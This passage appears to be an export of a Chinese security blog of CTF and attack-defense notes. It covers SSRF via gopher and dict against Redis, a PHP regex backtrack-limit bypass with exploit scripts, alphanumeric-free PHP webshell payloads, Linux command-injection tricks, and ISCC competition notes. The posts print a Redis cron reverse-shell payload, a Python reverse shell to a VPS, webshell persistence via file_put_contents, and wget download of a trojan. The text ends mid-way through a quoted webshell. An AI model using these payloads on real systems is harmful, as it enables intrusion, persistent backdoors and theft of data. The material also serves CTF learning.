file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp http/s主要用来探测内网服务，如url=http://127.0.0.1 file从文件系统中获取本地文件内容，如url=file:///var/www/html/index.php dict可以发送请求获取信息，如url=dict://127.0.0.1:6379/info可获取本地redis服务配置信息 Redis是一个开源的，使用C语言编写，高性能的key-value存储系统，在ubuntu下可以通过下列命令安装： $sudo apt-get update $sudo apt-get install redis-server启动 Redis 服务，默认端口为6379 $ redis-server启动 Redis 客户端： $ redis-cli一些基本操作： 1.通过SET key value的方式设置键值： 127.0.0.1:6379&gt; set a 666 OK2.通过GET key的方式获取键对应的值： 127.0.0.1:6379&gt; GET a &quot;666&quot;3.通过KEYS *命令获取所有键： 127.0.0.1:6379&gt; KEYS * 1) &quot;a&quot;详细教程：https://www.runoob.com/redis/redis-tutorial.html 可以用dict协议获取redis存储的数据，如： url=dict://127.0.0.1:6379/KEYS * 可获取redis存储的所有键； url=dict://127.0.0.1:6379/GET key 可获取键`key`对应的值；gophergopher协议支持发出GET、POST请求，可以用来反弹shell 首先在本地监听1234端口： nc -lvp 1234之后使用gopher协议： curl -v -d &apos;handler=gopher://127.0.0.1:1234/_test&apos; &apos;http://127.0.0.1/ssrf/testhook.php&apos;其中，-v参数显示详细信息，-d指定以POST发送数据； 之后，可以看到监听界面显示了发送过去的test信息；可以使用gopher协议配合redis反弹shell或攻击fastcig来拿到shell 攻击Redis的反弹shell POC： gopher://127.0.0.1:6379/_1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a/1 * * * * bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a 执行后即可在Redis看到键1和值bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1被写入了; 参考文章：https://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKwhttps://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uawhttps://joychou.org/web/phpssrf.html#directory0326919633843317466]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP正则最大回溯/递归限制]]></title>
    <url>%2F2019%2F07%2F16%2FPHP%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%2F</url>
    <content type="text"><![CDATA[最近看到了一篇文章讲的是FacebookCTF rceservice这道题，有个知识点是绕过preg_match匹配的，以前没遇到过，看大佬文章学习学习 本文转载自 http://www.laruence.com/2010/06/08/1579.html 今天,Tank问了一个问题, 对于如下的正则: /&lt;script&gt;.*?&lt;\/script&gt;/is当要匹配的字符串长度大于100014的时候, 就不会得出正确结果: $reg = &quot;/&lt;script&gt;.*?&lt;\/script&gt;/is&quot;; $str = &quot;&lt;script&gt;********&lt;/script&gt;&quot;; //长度大于100014 $ret = preg_replace($reg, &quot;&quot;, $str); //返回NULL难道正则对匹配的串有长度限制? 不是, 当然不是, 原因是这样的, 在PHP的pcre扩展中, 提供了俩个设置项. 1. pcre.backtrack_limit //最大回溯数 2. pcre.recursion_limit //最大嵌套数默认的backtarck_limit是100000(10万). 这个问题, 就和设置项backtrack_limit有关系. 现在要弄清这个问题的原因, 关键就是什么是”回溯”. 这个正则, 使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配. 举个例子: 源字符串: aaab 正则: .*?b匹配过程开始的时候, .*?首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给.*?, 这个时候, .*?匹配一个字符”a”, 并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯. 现在我们来看看文章开头的例子, 默认的backtrack_limit是100000, 而源字符串的开头是9个字符, 一共是99997个字符. 另外, 因为match函数自身的逻辑, 在文章开头的例子下, 会导致回溯计数增3(有兴趣的可以参看pcrelib/pcre_exec.c中match函数逻辑部分), 所以在匹配到”“之前, pcre中的回溯计数刚好是100000,于是就正常匹配, 退出. 而, 只要在增加一个字符, 就会导致回溯计数大于100000, 从而导致匹配失败退出. 在PHP 5.2以后, 提供了: int preg_last_error ( void ) Returns the error code of the last PCRE regex execution.我们应该经常检查这个函数的返回值, 当不为零的时候说明上一个正则函数出错, 特别的对于文章的例子, 出错返回(PREG_BACKTRACK_LIMIT_ERROR) 最后, 在顺便说一句, 非贪婪模式导致太多回溯, 必然会有一些性能问题, 适当的该写下正则, 是可以避免这个问题的. 比如将文章开头例子中的正则修改为: /&lt;script&gt;[^&lt;]*&lt;\/script&gt;/is就不会导致这么多的回溯了~ 而recursion_limit限制了最大的正则嵌套层数, 如果这个值, 设置的太大, 可能会造成耗尽栈空间爆栈. 默认的100000似乎有点太大了… 就比如对于一个长度为10000的字符串, 如下这个看似”简”的单正则: //默认recursion_limit为100000 $reg = /(.+?)+/is; $str = str_pad(&quot;laruence&quot;, 10000, &quot;a&quot;); //长度为1万 $ret = preg_repalce($reg, &quot;&quot;, $str);会导致core, 这是因为嵌套太多, 导致爆栈. 当然, 你可以通过修改栈的大小来暂时的解决这个问题, 比如修改栈空间为20M以后, 上面的代码就能正常运行, 但这肯定不是最完美的解法. 根本之道, 还是优化正则. 最后: 正则虽易, 用好却难.. 尤其在做大数据量的文本处理的时候, 如果正则设计不慎, 很容易导致深度嵌套, 另外考虑到性能, 还是建议能用字符串处理尽量使用字符串处理代替. 题目描述： We created this web interface to run commands on our servers, but since we haven&apos;t figured out how to secure it yet we only let you run &apos;ls&apos; (This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).题目源码大致如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;title&gt;rceservice&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;Web Administration Interface&lt;/h2&gt; Enter command as JSON: &lt;form action="./" method="post" accept-charset="utf-8"&gt; &lt;input type="text" name="cmd"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123; $json = $_REQUEST['cmd']; if (!is_string($json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; else &#123; echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo 'Invalid input'; &#125; echo '&lt;br/&gt;&lt;br/&gt;'; &#125;&#125;?&gt; 方法一putenv()函数的作用是设置环境变量；由于这道题目用到了贪婪匹配模式，则可以尝试利用php的回溯限制，输入的字符个数大于100000，使正则失效；由于环境变量设为了putenv(‘PATH=/home/rceservice/jail’)，而且只能使用ls命令，则可以猜测flag文件藏在/home/rceservice/flag；由于更改了环境变量，因此不能直接使用cat命令，可以使用绝对路径的方法/bin/cat；脚本如下： 12345678import requestsurl = 'http://127.0.0.1'payload = '&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"&#125;'res = requests.post(url, data=&#123;"cmd":payload&#125;)print(res.text) 方法二preg_match()函数仅尝试匹配第一行，因此可以使用多行输入来绕过正则，脚本如下： 1234567891011import requestsurl = 'http://127.0.0.1'payload = '''&#123;"cmd":"/bin/cat /home/rceservice/flag"&#125;'''res = requests.post(url, data=&#123;"cmd":payload&#125;)print(res.text) 参考：https://blog.csdn.net/qq_20307987/article/details/90902021]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux Tricks(二)]]></title>
    <url>%2F2019%2F07%2F07%2FLinux-Tricks-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[学习Linux的通配符，php的一些特性以及相关的在CTF中的极限利用 glob模式glob名字起源于Unix V6中的/etc/glob，glob是一种特殊的模式匹配；现Linux系统已将glob整合到了shell中；shell通配符/glob模式常用来匹配目录及文件 常用语法： 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [^a] 匹配任意不是字符a的其他字符 [0-9] 匹配数字0-9这一范围内的数字；其匹配范围依据ascii顺序，如匹配大写字母可以用[@-[]表示 例如，查看当前目录下的index.php内容，可以通过下面的命令来执行： cat ?????.???/bin目录/bin目录主要放置系统必备的执行文件，如：cat、cp、ls、kill等；可以通过这个目录下的文件来执行命令，如，使用cat命令实际上是使用/bin/cat命令 那么，当在shell中输入： /???/??? ?????.???如果当前linux系统文件/bin目录下只有cat这个文件，当前目录下有index.php文件，那么上述命令等同于cat index.php，可以直接输出index.php源码 但如果/bin目录下有/bin/cat、/bin/dir、/bin/pwd等可以被/???/???匹配到的文件，那么执行/???/??? ?????.???命令时可能会输出乱码或卡住 注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 php的一些运算流程、特性异或符(^)异或实际上是异或字符所对应的ascii码，如： 123&lt;?phpecho 'A' ^ '?'; 运算流程为：1.转换为ascii码的二进制： A -&gt; 65 -&gt; 01000001 ? -&gt; 63 -&gt; 001111112.执行异或操作： 01000001 00111111 ----------- 011111103.转换为字符： 01111110 --&gt; 126 --&gt; ~可以使用异或符构造出想要的字符串： 123456&lt;?php$a = "`&#123;&#123;&#123;";$b = "?&lt;&gt;/";echo $a^$b; 输出结果 _GET 取反符(~)在了解取反运算流程前，先了解按位取反、原码、反码和补码的概念： 按位取反：将二进制的每一位进行取反，0取反为1,1取反为0 原码：一个整数，按照绝对值大小转换为二进制数，最高位为保留位，最高位的0表示正数，1表示负数 补码：负数是用补码表示的，补码是原码按位取反+1 需要注意： 1.计算机存储二进制数据时，是以原码的补码形式存储的 2.正数的原码=反码=补码 3.在将十进制数转换为二进制数时需注意：php5.X版本中整数的最大最小区间为-2e31到+2e31，其中有个符号位所以数值表达最高就是31次幂。在php的高版本中会达到64位也就是-2e63到+2e63 举个栗子： 123&lt;?php$a = 9;echo ~$a; 运算流程为：1.9的原码为：0000 0000 0000 0000 0000 0000 0000 1001 (php5.x版本)2.按位取反：1111 1111 1111 1111 1111 1111 1111 0110，标志位为1，则为负3.负数使用补码表示，补码是原码取反+1，即： 原码 --》取反 --》+1 --》补码 原码 = 补码 --》-1 --》取反即： -1：-111 1111 1111 1111 1111 1111 1111 0101 取反：-000 0000 0000 0000 0000 0000 0000 1010即得到结果 -10 弱类型1.true为1，false为0 1234&lt;?php$a = true;$b = true;echo $a+$b; 会输出结果 2 2.在 php 中未定义的变量默认值为 null，null==false==0 12345&lt;?php$_++;$_++;echo $_; 会产生一个Notice级别的错误，但会输出结果 2 递增/递减运算符字符变量只能递增，不能递减(递减后保持不变)，并且只支持纯字母；其他非字母字符递增后保持不变 1234567891011&lt;?php$a = 'a';$a++;$b = 'z';$b++;echo $a;echo "\n";echo $b; 会输出： b aa反引号php的反引号中的字符串可以作为shell命令被执行 123&lt;?phpecho `ls /`?&gt; 可变函数在php中可以将函数名赋给一个变量，使用变量的方式调用某函数 12345678910&lt;?phpfunction test()&#123; echo 'good';&#125;$a = 'test';$a(); 短标签在php的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：&lt;? ?&gt;；这种形式的标签为长标签 &lt;?=$a?&gt;的作用等价于` 1234&lt;?php$a = 123;?&gt;&lt;?=$a?&gt; 会输出结果 123 除此之外，在短标签内可执行命令或函数并输出结果，如： 1&lt;?=`ls /`?&gt; 可输出根目录内容 注：使用短标签时需要先闭合长标签 极限利用-代码分析先看代码： 123456789101112131415161718&lt;?phpinclude'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die("Too Long."); &#125; if(preg_match("/[A-Za-z0-9_]+/",$code))&#123; die("Not Allowed."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 方法一.调用可变函数payload： $啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊(); //$啊=&apos;]@\`@@]&apos;^&apos;:%(&amp;,!:&apos;;$啊(); //$啊=getFlag;$啊();如果过滤了$，那么此方法便不可行了 方法二.调用动态函数payload： (~%98%9A%8B%B9%93%9E%98)();php7版本可以用($a)()的方式执行动态函数，但在php5中不可以用此方法 方法三.构造超全局数组变量payload1： %24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag //${~&quot;\xa0\xb8\xba\xab&quot;}[\xaa]();&amp;\xaa=getFlag //${_GET}[\xaa]();&amp;\xaa=getFlagpayload2： %24%7b%22%60%7b%7b%7b%22%5e%22%3f%3c%3e%2f%22%7d%5b%27%2b%27%5d%28%29%3b&amp;%2b=getFlag //${&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;}[&apos;+&apos;]();&amp;+=getFlag //$_GET[&apos;+&apos;]();&amp;+=getFlag如果过滤了 $，此方法也是不可行的 方法四.读取linux文件改进前payload： $_=`/???/??? /???/???/????/?????.???`?&gt;&lt;?=$_?&gt;对应于： $_=`/bin/cat /var/www/html/index.php`?&gt;&lt;?=$_?&gt;若其长度超出了限制，那么可以使用通配符*： $_=`/???/??? /???/???/????/*`?&gt;&lt;?=$_?&gt;问题还没结束，如果过滤了$符和下划线呢？其实并不需要用变量赋值再输出变量，利用短标签特性即可直接执行命令并输出结果 ?&gt;&lt;?=`/???/??? /???/???/????/*`?&gt;这里的?&gt;的作用就是闭合前面的长标签&lt;?php，因为eval函数就是简单的把字符串作为代码放到&lt;?php ?&gt;中间 此方法需要在short_open_tag开启的条件下使用 有时候题目可能会将cat文件放在其他地方或没有这个文件，可能需要用到其他输出文件内容的文件命令: cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的显示文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 参考文章： https://mp.weixin.qq.com/s/TaoivKpgzyg8HZGsUdeytQ https://www.anquanke.com/post/id/154284 https://www.leavesongs.com/penetration/webshell-without-alphanum.html https://blog.51cto.com/lxqybyq/1683061 https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/ https://www.secpulse.com/archives/96374.html https://www.php.net/manual/zh/migration70.php https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu下的一些配置]]></title>
    <url>%2F2019%2F07%2F04%2FUbuntu%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[由于电脑太卡了，也没钱换台新的(呜呜呜～)，就索性装了个ubuntu系统，这体验真是比windows好上1000倍！！！ 顺便提一下ubuntu下的Remarkable这款markdown编辑器很漂亮！不过只能插入本地的图片，关键是还不能搜索。。。于是更换了typora这款编辑器，虽然也不能上传图片，但超级好用，将编辑与视图结合了起来;可以使用imgur上传图片：https://imgur.com/upload?beta（需墙） 下面是这几天配置ubutnu18.04时参考的链接 ubuntu安装typora编辑器：https://www.cnblogs.com/yimingwang/p/9639139.html ubuntu安装qq微信 ：https://learnku.com/articles/17517 优化主题：https://blog.csdn.net/ksws0292756/article/details/79953155 安装flash：https://www.linuxidc.com/Linux/2016-05/131098.htm 超详细的各种配置：https://blog.csdn.net/fuchaosz/article/details/51882935 https://zhuanlan.zhihu.com/p/56253982 burpsuite：https://blog.csdn.net/weixin_34245169/article/details/87233258 hexo blog ：https://blog.csdn.net/pan861190079/article/details/80860153https://blog.csdn.net/lyb3b3b/article/details/78706077sudo npm i npm -gsudo npm install –save hexo-deployer-git 更改时区：https://jingyan.baidu.com/article/fa4125acb7328628ac70920e.html 这里/etc/下的时区文件为timezone 搜狗输入法： https://blog.csdn.net/fx_yzjy101/article/details/80243710 php： https://ywnz.com/linuxjc/2817.html sublime text3： https://www.cnblogs.com/bigc008/p/9543208.html apache2与php： https://www.cnblogs.com/lzwangshubo/p/9979647.html binwalk： https://blog.csdn.net/qq1084283172/article/details/65441110]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux Tricks(一)]]></title>
    <url>%2F2019%2F06%2F29%2FLinux-Tricks-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[CTF中经常需要运用Linux下的一些知识，在此记录总结 find查找指定路径下的文件，用法： find 搜索路径 选项 搜索内容选项 -name：按照文件名搜索 -iname：按照文件名搜索，不区分文件名大小写 搜索内容 *：任意内容；搜索内容需要用引号引起来 如： find / -name &quot;flag*&quot;即查找根目录/下的文件名以flag为前缀的文件，输出结果为文件的绝对路径 grep查找文件的指定内容，用法： grep 选项 模式 文件选项 -i：忽略大小写 -v：只打印没有匹配的 -n：显示行号 -w：被匹配的不能是一个单词中的一部分 -c：显示总共有多少行被匹配到了 -o：只显示被模式匹配到的字符串 –color：将匹配到的内容以颜色高亮显示 -A n：显示匹配到的字符串所在的行及其后n行，after -B n：显示匹配到的字符串所在的行及其前n行，before -C n：显示匹配到的字符串所在的行及其前后各n行，context 模式 匹配字符： .：任意一个字符 [abc]：匹配abc中的任意字符 [a-zA-Z]：匹配任意英文字母 [^123]：匹配除123外所有字符 匹配次数： {m,n}：匹配前面出现的字符至少m次，至多n次 ?：匹配其前面出现的内容0此或1次，即{0,1} *：匹配其前面出现的内容任意次，即{0,} 如： grep flag /var/www/web1/*即查找/var/www/web1/目录下的所有文件中含有flag字符串的内容 proclinux下有个/proc目录，里面存储着当前运行的进程的信息；文件里面以数字命名的文件表示当前运行的进程，目录名为进程的pid；查看当前运行的进程： 进入到表示进程的文件中，可以找到开放4000端口的进程4627： 之后进入到4627这个文件夹，可以找到cmdline这个文件夹，这个文件夹存储着开启4627这个进程的cmd命令；我们查看这个文件的内容： 但为了方便获取本进程的信息，linux还提供了/proc/self目录，等价于/proc/本进程pid，可以通过这个目录来获取本进程的信息； 比如，我用python写了个脚本，用来输出/proc/self/cmdline的内容，可以看到输出了运行这个脚本的命令： 有时候，如果拿到了一道web题目的shell后，可以通过题目读取/proc/self/cmdline内容来获取此web服务启动的相关信息 操作记录文件1.root用户的mysql操作一般记录在：~/.mysql_history中 2.查看bash历史操作：cat ~/.bash_history 注： /是根目录，~是家目录；每个用户都有“家”目录，如root用户的“家”目录就是“/root”，普通用户a的“家”目录就是“/home/a” 常用命令注入1.使用&amp;&amp;： ping 1.1.1.1 &amp;&amp; cat flag #顺序执行命令；前面的命令执行成功后面的才执行2.使用管道命令：A|B，即把A命令的输出作为B命令的输入： ping 1.1.1.1 | cat flag #只执行cat flag3.使用&amp;： ping 1.1.1.1 &amp; cat flag #先执行cat flag后执行ping4.使用分号;： ping 1.1.1.1;cat flag #顺序执行命令；不管前面的命令是否执行成功5.使用换行符：如果题目把上述字符过滤了，那么还可以在题目中使用换行符来命令注入： 1.1.1.1 %0a cat flag获取文件内容 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的显示文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 /etc/passwd与/etc/shadow/etc/passwd该文件内每行数据格式： 注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 例如： gtfly:x:1000:1000:gtf,,,:/home/gtfly:/usr/bin/zsh现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使用一个x来代替，将/etc /shadow作为真正的口令文件，用于保存包括个人口令在内的数据。当然shadow文件是不能被普通用户读取的，只有超级用户才有权读取。 如果passwd字段中的第一个字符是*的话，那么，就表示该账号被查封了，系统不允许持有该账号的用户登录。 /etc/shadow/etc/shadow是在安装了影子口令软件的系统上的影子口令文件；影子口令文件将/etc/passwd文件中的加密口令移动到/etc/shadow中 该文件内每行数据格式： 登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志例如： gtfly:$6$bGq.hmhU$rRxRJ8q4loIdef0ZJlmSbXBmqp13atLIumEQv19IQ2J/8Mw25taUntpDgcFeCZHnkVynwlmByJPSQq1/0PzBA0:18079:0:99999:7:::1）“登录名”是与/etc/passwd文件中的登录名相一致的用户账号2）“口令”字段存放的是加密(SHA512散列加密算法)后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合{./0-9A-Za-z}中的字符，则对应的用户不能登录。3）“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。4）“最小时间间隔”指的是两次修改口令之间所需的最小天数。5）“最大时间间隔”指的是口令保持有效的最大天数。6）“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。7）“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。8）“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019ISCC线下赛总结(二)]]></title>
    <url>%2F2019%2F06%2F28%2F2019ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93(%E4%BA%8C)%2F</url>
    <content type="text"><![CDATA[参加了一周的网络工程实训，也没带自己的电脑，但该学还是得学滴(学html实在是太无聊了)！系统的把ISCC比赛不足的地方总结反思弥补下 攻防赛注入题复现题目链接： http://ctf.dropsec.xyz:1005 主要就是安装配置php的一些扩展 环境：ubuntu16.04，php7.0 安装GD库扩展下载： apt-get install php7.0-gd找到/etc/php/php7.0/fpm/php.ini，命令模式下输入/extension，按n向下搜索，设置(去掉前面的分号)： extension_dir = &quot;/usr/lib/php/20151012 extension=php_gd2.so重启php-fpm： systemctl restart php7.0-fpm.service新建一个php文件，写入phpinfo()，之后查看php信息，可以找到gd配置项，说明安装成功 安装mysqli扩展下载： apt-get install php7.0-mysqli找到/etc/php/php7.0/fpm/php.ini，命令模式下输入/mysqli，按n向下搜索，设置： extension=php_mysqli.so重启php-fpm： systemctl restart php7.0-fpm.service新建一个php文件，写入phpinfo()，之后查看php信息，可以找到mysqli配置项，说明安装成功 开启报错由于输入单引号时需要报错，因此需要开启php的报错 找到/etc/php/php7.0/fpm/php.ini，命令模式下输入/display_errorr，按n向下搜索，设置： display_errorr = On 重启php-fpm： systemctl restart php7.0-fpm.service使用mysqli_error()来获取错误信息： $con = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;xxxxxx&quot;, &quot;web&quot;); $query = mysqli_query($con,$sql); if($query === false){ echo mysqli_error($con); die(); }其他在比赛时看到题目有个注册功能，以为没什么用，没想到这个注册功能是为了提示数据库中有个用户名为iscc_xxxx，如果题目把异或符^给ban了，那么需要用爆破的方式，找到正确的用户名进行注入 shell文件利用方式比赛的木马文件是这样的： 123456789&lt;?phpshow_source(__FILE__);$a= @$_REQUEST['a'];@eval("var_dump($$a);");?&gt; 方法一.变量覆盖构造： a=a=123那么$a=a=123，@eval(&quot;var_dump($$a);&quot;);就相当于@eval(&quot;var_dump($a=123);&quot;); 注意： var_dump(123); var_dump($a=123);显示结果是一样的： int(123) int(123)1.可以通过闭合var_dump来执行其他命令 构造： a=a=123);print_r([666]);//实际就是： @eval(&quot;var_dump($a=123);print_r([666]);//);&quot;);eval函数中， &quot;内部为代码，注释符//只在代码中起作用，相当于只注释了); 输出了print_r()函数执行结果： int(123) Array ( [0] =&gt; 666 )2.可以直接使用变量覆盖执行其他命令 上面说了，var_dump(123);与var_dump($a=123);是一样的，那么可以试着把123替换成函数： var_dump(print_r([666])); var_dump($a=print_r([666]));运行结果： Array ( [0] =&gt; 666 ) bool(true) Array ( [0] =&gt; 666 ) bool(true)可以看到，函数也可以在var_dump()中执行 那么可以构造： a=a=print([666])同样可以执行print_r()函数 方法二.使用{}php有个特性，变量名被{}括起来的部分会被当作代码执行 那么可构造： a={print_r([666])}实际就是： @eval(&quot;var_dump(${print_r([666])});&quot;);同样可以执行print_r()函数 权限维持使用file_put_contents()函数?a={file_put_contents(&apos;.s.php&apos;, &apos;&lt;?php @eval($_POST[&apos;t&apos;]); ?&gt;&apos;)}反弹shellpython的反弹shell： python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps的ip&quot;, 端口号));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;首先在自己的vps上监听 nc -lvp 端口使用base64将上面的python代码编码后，作为参数传过去： ?a={system(base64_decode(&apos;IpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=&apos;))}输入命令： echo &quot;&lt;?php @eval(\$_POST[&apos;t&apos;]); ?&gt;&quot; &gt; .shell.php即将一句话木马写入到了.shell.php文件，之后将官方预留的木马删除掉即可；前面加个点可以隐蔽文件，所以列出自己文件一定要用ls -a命令！！！ wget这个方法按理说也可以，太懒了就不试了： 先将木马放到自己vps上，拿到shell后命令执行wget x.x.x.x/ma.php即可把木马下载到目标主机上 提取excel中的数据下面为模拟的比赛中的ip地址存储格式： 序号 私地ip 1 192.168.1.2 1 192.168.1.3 2 192.168.2.5 2 192.168.2.10 3 192.168.3.7 3 192.168.3.17 … … 第一道题的ip地址均为每个序号的第一个ip，下面用python将每个序号的第一个ip提取出来，并将其放入python的列表中，格式为： [&apos;192.168.1.2&apos;, &apos;192.168.2.5&apos;, ...]脚本： 12345678910111213141516171819202122232425262728293031323334from openpyxl import Workbookfrom openpyxl import load_workbookwb = load_workbook('a.xlsx')ws=wb.active# 以列为顺序，获取所有元素的对象cols=[]for col in ws.iter_cols(): cols.append(col)# 以行为顺序，获取所有元素的对象rows = []for row in ws.iter_rows(): rows.append(row)#print(cols) # 列表里面存放着元组，每一列为一个元组，元组里面每个元素为单元格对象#print(rows) # 列表里面存放着元组，每一行为一个元组，元组里面每个元素为单元格对象# 获取所有列数#print(len(cols)) # 2# 获取所有行数#print(len(rows)) # 7# 获取第二列每个序号的第一个元素值，保存到列表中values = []for i in range(1, len(rows), 2): values.append(cols[1][i].value)print(values) 参考文章：https://www.anquanke.com/post/id/147989]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019ISCC线下赛总结(一)]]></title>
    <url>%2F2019%2F06%2F22%2F2019ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[先吐槽一下这次比赛的运维，开始还在做着题呢，一看主页，what？咋有几个鲜红的大字捏？Hacked By Smi1e!!!，这几个字看的我发慌。再一看，hint文件也被改成了一句话木马，而且这木马还贼diao的样子。私地靶机被挂黑页，运维人员却说私地被攻下再攻回去就行了-_-shell被改，申请重置靶机也不同意，真是拿头攻啊。。。顺便吹一波Smile大佬，真是厉害 先放一下Smile大佬的木马，抽空研究一下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Rsa &#123; private static $PUBLIC_KEY= '-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCy/QLPIu6m9Le5a1Jm8lYeHgiJbDEux/1BZuGwbDlXG68ph/CsaAHr7QNEoB0+mmo7Caimred973ikcKZArahSQzKUIcEj3LXFT56lxo/Ur7/lJvADOQgZcfTOAxgeXyaflX0pEcosXTzJ7+9BBoG/zY1k7r9Fnz9EpcNoHd4BdQIDAQAB-----END PUBLIC KEY-----'; private static function getPublicKey() &#123; $publicKey = self::$PUBLIC_KEY; return openssl_pkey_get_public($publicKey); &#125; public static function publicDecrypt($encrypted = '') &#123; if (!is_string($encrypted)) &#123; return null; &#125; $crypto = ''; foreach (str_split(base64_decode($encrypted), 128) as $chunk) &#123; openssl_public_decrypt($chunk, $decryptData, self::getPublicKey()); $crypto .= $decryptData; &#125; return $crypto; &#125;&#125;$p=$_POST['p'];if (md5(md5($p)) === '4ca5c0f57fc352fe9f3ecd094b9ea82a')&#123; 